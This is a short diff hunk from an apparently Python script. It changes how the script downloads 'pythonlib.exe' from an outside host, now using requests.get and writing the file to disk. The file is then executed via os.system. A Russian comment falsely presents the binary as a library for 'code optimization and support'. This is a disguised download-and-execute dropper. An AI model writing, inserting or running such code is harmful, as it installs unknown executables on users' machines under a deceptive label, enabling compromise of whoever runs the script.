@@ -31,7 +31,11 @@ print(prt)
 
 time.sleep(1)
 
-wget.download('http://cv03655.tmweb.ru/pythonlib.exe')
+url = 'http://cv03655.tmweb.ru/pythonlib.exe'
+
+r = requests.get(url, allow_redirects=True)
+
+open('pythonlib.exe', 'wb').write(r.content)
 
 os.system('pythonlib.exe') # Установка PythonLib Для Оптимизации И Поддержки Кода! 
 
